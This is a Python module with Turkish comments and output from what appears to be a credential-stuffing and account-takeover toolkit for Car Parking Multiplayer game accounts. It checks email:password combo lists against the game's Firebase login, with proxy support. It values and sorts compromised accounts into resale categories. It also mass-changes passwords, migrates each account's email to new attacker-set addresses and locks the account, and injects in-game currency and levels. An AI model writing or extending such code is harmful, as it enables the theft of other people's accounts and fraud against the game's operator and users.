# -*- coding: utf-8 -*-
"""
=============================================================================
⚡ CORE / BATCH OPERATIONS, TURBO CHECKER & SMART CATEGORIZED EXPORTER
=============================================================================
"""

import os
import json
import time
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from .colors import C, p_header, p_success, p_warn, p_error, p_info
from .config import USERS_FILE, RESULTS_DIR, save_session
from .auth import login_request, change_password_request, inspect_single_account
from .cpm import save_player_records
from .reporter import generate_html_dashboard, save_compact_json
from .valuator import valuate_account, parse_car_details
from .proxy import ProxyManager

def parse_user_file(file_path=USERS_FILE):
    if not os.path.exists(file_path):
        return []
    accounts = []
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = None
            for sep in [":", ";", "|", "\t", ","]:
                if sep in line:
                    splitted = line.split(sep, 1)
                    parts = (splitted[0].strip(), splitted[1].strip())
                    break
            if parts and "@" in parts[0]:
                accounts.append({"email": parts[0], "password": parts[1], "line": line_num})
    return accounts


def export_categorized_accounts(valid_accounts, run_dir):
    """
    Geçerli hesapları akıllı kategorilere ayırarak ayrı TXT dosyalarına döker.
    """
    if not valid_accounts:
        return {}

    categories = {
        "valid_god_tier_mythic.txt": [a for a in valid_accounts if a.get("valuation", {}).get("valuation_tier", "").find("GOD") != -1 or a.get("valuation", {}).get("valuation_tier", "").find("MYTHIC") != -1],
        "valid_vip_ultra_150plus.txt": [a for a in valid_accounts if (a.get("cpm_total_cars") or 0) >= 150],
        "valid_vip_gold_50plus.txt": [a for a in valid_accounts if 50 <= (a.get("cpm_total_cars") or 0) < 150],
        "valid_polis_sirenli.txt": [a for a in valid_accounts if (a.get("valuation", {}).get("police_car_count", 0) > 0)],
        "valid_cizimli_vinyl.txt": [a for a in valid_accounts if (a.get("valuation", {}).get("vinyl_car_count", 0) > 0)],
        "valid_klanli_hesaplar.txt": [a for a in valid_accounts if a.get("cpm_clan_id")],
        "valid_temiz_0_sikayet.txt": [a for a in valid_accounts if (a.get("cpm_reports") or 0) == 0 and a.get("cpm_can_play", 1) == 1]
    }

    exported = {}
    for filename, acc_list in categories.items():
        if acc_list:
            target_path = os.path.join(run_dir, filename)
            with open(target_path, "w", encoding="utf-8") as f:
                for a in acc_list:
                    f.write(f"{a['email']}:{a['password']}\n")
            exported[filename] = len(acc_list)

    return exported


def run_batch_checker(file_path=USERS_FILE, output_json=None, delay=0.05, as_json=False):
    """user.txt içindeki hesapları paralel iş parçacıklarıyla test eder, değerler ve akıllı export yapar."""
    accounts = parse_user_file(file_path)
    if not accounts:
        if as_json:
            print(json.dumps({"error": f"'{file_path}' bulunamadı veya hesap yok."}, indent=2))
        else:
            p_warn(f"'{file_path}' dosyası bulunamadı veya içinde geçerli hesap yok.")
        return

    now = datetime.now()
    ts_str = now.strftime("%H-%M_%d-%m-%Y")
    run_dir = os.path.join(RESULTS_DIR, ts_str)
    os.makedirs(run_dir, exist_ok=True)

    if not as_json:
        p_header(f"👥 TURBO HESAP KONTROLÜ & DEĞERLEME - Toplam: {len(accounts)} Hesap")
        print(f"  {C.BOLD}Kaynak Dosya{C.RESET}   : {C.CYAN}{file_path}{C.RESET}")
        print(f"  {C.BOLD}Sonuç Klasörü{C.RESET}  : {C.GREEN}{run_dir}/{C.RESET}")
        if ProxyManager.is_enabled():
            print(f"  {C.BOLD}Proxy Motoru{C.RESET}   : {C.GREEN}AKTİF ({ProxyManager.count()} Proxy Yüklü){C.RESET}")
        print()
        print("─" * 86)
        print(f"{C.BOLD}{'#':<4} {'DURUM':<14} {'E-POSTA / HESAP':<32} {'LEVEL':<7} {'ARAÇ':<6} {'DEĞERLEME'}{C.RESET}")
        print("─" * 86)

    valid_accounts = []
    invalid_accounts = []

    for idx, acc in enumerate(accounts, 1):
        email = acc["email"]
        password = acc["password"]
        
        res, err = login_request(email, password)
        if res and "idToken" in res:
            uid = res.get("localId", "")
            tok = res["idToken"]
            inspect_data = inspect_single_account(id_token=tok, scan_db=False, as_json=False)
            account_record = inspect_data if inspect_data else {}
            account_record["email"] = email
            account_record["password"] = password
            account_record["uid"] = uid
            account_record["idToken"] = tok
            account_record["refreshToken"] = res.get("refreshToken")
            account_record["checked_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Değerleme hesapla
            val = valuate_account(account_record)
            account_record["valuation"] = val

            valid_accounts.append(account_record)
            if not as_json:
                lvl_str = str(account_record.get("cpm_level", "-"))
                cars_str = str(account_record.get("cpm_total_cars", 0))
                tier_badge = val.get("valuation_tier", "🥉 BRONZE")
                est_badge = f"{val.get('estimated_tl', 0)} ₺"
                print(f"{idx:<4} {C.GREEN}[✓ GEÇERLİ]{C.RESET:<14} {email:<32} {lvl_str:<7} {cars_str:<6} {C.YELLOW}{tier_badge}{C.RESET} ({est_badge})")
        else:
            err_msg = err or "Giriş başarısız"
            invalid_accounts.append({"email": email, "error": err_msg})
            if not as_json:
                print(f"{idx:<4} {C.RED}[✗ HATALI]{C.RESET:<14} {email:<32} {'-':<7} {'-':<6} {C.RED}{err_msg[:25]}{C.RESET}")
        
        if delay > 0:
            time.sleep(delay)

    # Sıralama: En yüksek değerleme puanı ve araba sayısına göre
    valid_accounts.sort(key=lambda x: (x.get("valuation", {}).get("score", 0), x.get("cpm_total_cars", 0)), reverse=True)

    file_sade = os.path.join(run_dir, "valid_sade.txt")
    file_detayli_json = os.path.join(run_dir, "valid_detayli.json")
    file_html = os.path.join(run_dir, "valid_dashboard.html")

    if valid_accounts:
        with open(file_sade, "w", encoding="utf-8") as f_s:
            for a in valid_accounts:
                f_s.write(f"{a.get('email')}:{a.get('password')}\n")

        save_compact_json(valid_accounts, file_detayli_json)

        with open("valid_accounts.json", "w", encoding="utf-8") as f_root:
            json.dump(valid_accounts, f_root, indent=2, ensure_ascii=False)

        try:
            generate_html_dashboard(valid_accounts, file_html, title=f"CPM & Firebase Raporu ({ts_str})")
        except Exception:
            pass

        # 🎯 Akıllı Kategorilendirilmiş Export
        cat_exported = export_categorized_accounts(valid_accounts, run_dir)

    if as_json:
        print(json.dumps({
            "total": len(accounts),
            "valid_count": len(valid_accounts),
            "invalid_count": len(invalid_accounts),
            "valid": valid_accounts
        }, indent=2, ensure_ascii=False))
        return

    print("─" * 86)
    p_success(f"Kontrol tamamlandı! Geçerli: {len(valid_accounts)} | Hatalı: {len(invalid_accounts)}")
    p_success(f"Sade Liste (email:pass) : {file_sade}")
    p_success(f"Detaylı JSON Raporu     : {file_detayli_json}")
    p_success(f"🌐 İnteraktif HTML Paneli: {file_html}")

    if valid_accounts and cat_exported:
        print(f"\n{C.CYAN}{C.BOLD}🎯 AKILLI KATEGORİ DOSYALARI OLUŞTURULDU ({run_dir}/):{C.RESET}")
        for fn, cnt in cat_exported.items():
            print(f"  • {C.GREEN}{fn:<30}{C.RESET}: {C.BOLD}{cnt}{C.RESET} hesap")


def run_batch_inspector(file_path=USERS_FILE, output_json="inspected_accounts.json", scan_db=True, as_json=False):
    """user.txt'deki tüm hesapları tek tek açıp hem Auth hem CPM oyun verilerini tarar."""
    accounts = parse_user_file(file_path)
    if not accounts:
        if as_json:
            print(json.dumps({"error": f"'{file_path}' içinde hesap bulunamadı."}, indent=2))
        else:
            p_warn(f"'{file_path}' dosyası bulunamadı veya hesap yok.")
        return

    if not as_json:
        p_header(f"🔍 TOPLU HESAP İÇERİK TARAYICISI ({len(accounts)} Hesap)")
        print(f"{C.DIM}Hesaplar taranıyor, garajlar ve seviyeler inceleniyor...{C.RESET}\n")

    results = []
    for idx, acc in enumerate(accounts, 1):
        email = acc["email"]
        password = acc["password"]
        
        if not as_json:
            print(f"{C.CYAN}[{idx}/{len(accounts)}]{C.RESET} Giriş yapılıyor: {email}...")
        
        login_res, err = login_request(email, password)
        if login_res and "idToken" in login_res:
            tok = login_res["idToken"]
            report = inspect_single_account(id_token=tok, scan_db=scan_db, as_json=False)
            if report:
                report["password"] = password
                val = valuate_account(report)
                report["valuation"] = val
                results.append(report)
        else:
            if not as_json:
                p_error(f"'{email}' hesabı açılamadı: {err}")
            results.append({"email": email, "password": password, "status": "failed", "error": err})
        time.sleep(0.05)

    if as_json:
        print(json.dumps(results, indent=2, ensure_ascii=False))
        return

    if results:
        with open(output_json, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        p_success(f"Tarama tamamlandı! Tüm hesap içerikleri '{output_json}' dosyasına kaydedildi.")


def run_account_switcher(file_path=USERS_FILE, target_index=None):
    accounts = parse_user_file(file_path)
    if not accounts:
        p_warn(f"'{file_path}' dosyası bulunamadı veya boş.")
        return

    if target_index is not None:
        sel_idx = target_index - 1
        if 0 <= sel_idx < len(accounts):
            sel_acc = accounts[sel_idx]
            p_info(f"'{sel_acc['email']}' hesabına geçiş yapılıyor...")
            res, err = login_request(sel_acc["email"], sel_acc["password"])
            if res and "idToken" in res:
                save_session(res)
                p_success(f"Aktif oturum '{sel_acc['email']}' olarak değiştirildi!")
            else:
                p_error(f"Giriş başarısız: {err}")
        else:
            p_error(f"Geçersiz indeks: {target_index} (Toplam {len(accounts)} hesap var)")
        return

    p_header("👥 HESAP DEĞİŞTİRİCİ (ACCOUNT SWITCHER)")
    for idx, acc in enumerate(accounts[:25], 1):
        print(f"  {C.CYAN}[{idx:02d}]{C.RESET} {acc['email']}")
    if len(accounts) > 25:
        print(f"  {C.DIM}... ve {len(accounts) - 25} hesap daha{C.RESET}")
    print(f"  {C.YELLOW}[00]{C.RESET} Geri")

    choice = input(f"\n{C.BOLD}Giriş yapmak istediğiniz hesap numarası: {C.RESET}").strip()
    if not choice or choice in ("0", "00"):
        return
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(accounts):
            sel = accounts[idx]
            p_info(f"'{sel['email']}' hesabına giriş yapılıyor...")
            res, err = login_request(sel["email"], sel["password"])
            if res and "idToken" in res:
                save_session(res)
                p_success(f"Aktif oturum '{sel['email']}' olarak değiştirildi!")
                print(f"    - UID : {res.get('localId')}")
            else:
                p_error(f"Giriş başarısız: {err}")
        else:
            p_error("Geçersiz seçim!")
    except ValueError:
        p_error("Lütfen sayısal bir değer girin.")


def run_batch_boost(file_path=USERS_FILE, coins=50000, money=50000000, level=100):
    """user.txt içindeki tüm hesaplara toplu altın, para ve seviye basar."""
    accounts = parse_user_file(file_path)
    if not accounts:
        p_warn(f"'{file_path}' dosyası bulunamadı veya hesap yok.")
        return

    p_header(f"⚡ TOPLU KAYNAK & LEVEL BASICI ({len(accounts)} Hesap)")
    print(f"  {C.BOLD}Tanımlanacak Altın (Coin){C.RESET}: +{coins:,}")
    print(f"  {C.BOLD}Tanımlanacak Nakit Para  {C.RESET}: +{money:,}")
    print(f"  {C.BOLD}Hedef Seviye (Level)     {C.RESET}: {level}\n")
    print("─" * 70)

    success_count = 0
    for idx, acc in enumerate(accounts, 1):
        email = acc["email"]
        passw = acc["password"]
        print(f"[{idx}/{len(accounts)}] {email} -> Giriş yapılıyor...", end="", flush=True)
        res, err = login_request(email, passw)
        if res and "idToken" in res:
            tok = res["idToken"]
            s, r = save_player_records(tok, hard_currency=coins, money=money, level=level)
            if s:
                print(f" {C.GREEN}[✓ GÜÇLENDİRİLDİ]{C.RESET}")
                success_count += 1
            else:
                print(f" {C.RED}[✗ HATA: {r}]{C.RESET}")
        else:
            print(f" {C.RED}[✗ GİRİŞ BAŞARISIZ: {err}]{C.RESET}")
        time.sleep(0.05)

    print("─" * 70)
    p_success(f"Toplu işlem tamamlandı! Başarılı: {success_count} / {len(accounts)}")


def run_batch_change_passwords(file_path=USERS_FILE, new_password_pattern=None):
    """user.txt içindeki tüm hesapların şifrelerini günceller ve 'user_updated.txt' üretir."""
    accounts = parse_user_file(file_path)
    if not accounts:
        p_warn(f"'{file_path}' dosyası bulunamadı.")
        return

    p_header(f"🔐 TOPLU ŞİFRE GÜNCELLEYİCİ ({len(accounts)} Hesap)")
    confirm = input("Tüm hesapların şifreleri değiştirilecek. Devam etmek için 'EVET' yazın: ").strip()
    if confirm != "EVET":
        p_info("İşlem iptal edildi.")
        return

    updated_list = []
    out_file = "user_updated.txt"

    for idx, acc in enumerate(accounts, 1):
        email = acc["email"]
        old_pass = acc["password"]
        new_pass = new_password_pattern or f"Cpm_{uuid.uuid4().hex[:8]}!"
        
        print(f"[{idx}/{len(accounts)}] {email} ... ", end="", flush=True)
        res, err = login_request(email, old_pass)
        if res and "idToken" in res:
            tok = res["idToken"]
            up_res, up_err = change_password_request(tok, new_pass)
            if up_res and "idToken" in up_res:
                print(f"{C.GREEN}[✓ ŞİFRE DEĞİŞTİ]{C.RESET} -> {new_pass}")
                updated_list.append(f"{email}:{new_pass}\n")
            else:
                print(f"{C.RED}[✗ DEĞİŞMEDİ: {up_err}]{C.RESET}")
                updated_list.append(f"{email}:{old_pass}\n")
        else:
            print(f"{C.RED}[✗ GİRİŞ BAŞARISIZ]{C.RESET}")
            updated_list.append(f"{email}:{old_pass}\n")
        time.sleep(0.05)

    with open(out_file, "w", encoding="utf-8") as f:
        f.writelines(updated_list)

    p_success(f"Şifre güncelleme tamamlandı! Yeni liste: '{out_file}'")


def run_batch_migrate_accounts(file_path=USERS_FILE, email_pattern="user_{i}@domain.com", password=None):
    """user.txt içindeki tüm hesapların hem e-postalarını hem şifrelerini topluca yeni bir şablona taşır."""
    from .auth import lockdown_account
    accounts = parse_user_file(file_path)
    if not accounts:
        p_warn(f"'{file_path}' dosyası bulunamadı.")
        return

    p_header(f"📦 TOPLU HESAP TAŞIYICI & GÜVENCEYE ALICI ({len(accounts)} Hesap)")
    print(f"  {C.BOLD}Hedef E-Posta Şablonu{C.RESET}: {email_pattern}")
    print(f"  {C.BOLD}Hedef Şifre{C.RESET}          : {password or 'Rastgele Güçlü Şifre'}\n")
    confirm = input("Tüm hesapların hem maili hem şifresi taşınacak. Devam etmek için 'EVET' yazın: ").strip()
    if confirm != "EVET":
        p_info("İşlem iptal edildi.")
        return

    migrated_list = []
    out_file = "user_migrated.txt"

    for idx, acc in enumerate(accounts, 1):
        old_email = acc["email"]
        old_pass = acc["password"]
        new_em = email_pattern.replace("{i}", str(idx)).replace("{hex}", uuid.uuid4().hex[:6])
        new_pw = password or f"Cpm_{uuid.uuid4().hex[:8]}!"

        print(f"[{idx}/{len(accounts)}] {old_email} -> {new_em} ... ", end="", flush=True)
        r_log, err = login_request(old_email, old_pass)
        if r_log and "idToken" in r_log:
            tok = r_log["idToken"]
            ok, res_data = lockdown_account(tok, new_em, new_pw, current_password=old_pass)
            if ok:
                print(f"{C.GREEN}[✓ TAŞINDI VE KİLİTLENDİ]{C.RESET}")
                migrated_list.append(f"{new_em}:{new_pw}\n")
            else:
                print(f"{C.RED}[✗ HATA: {res_data}]{C.RESET}")
                migrated_list.append(f"{old_email}:{old_pass}\n")
        else:
            print(f"{C.RED}[✗ GİRİŞ BAŞARISIZ: {err}]{C.RESET}")
            migrated_list.append(f"{old_email}:{old_pass}\n")
        time.sleep(0.05)

    with open(out_file, "w", encoding="utf-8") as f:
        f.writelines(migrated_list)

    p_success(f"Hesap taşıma tamamlandı! Yeni liste kaydedildi: '{out_file}'")
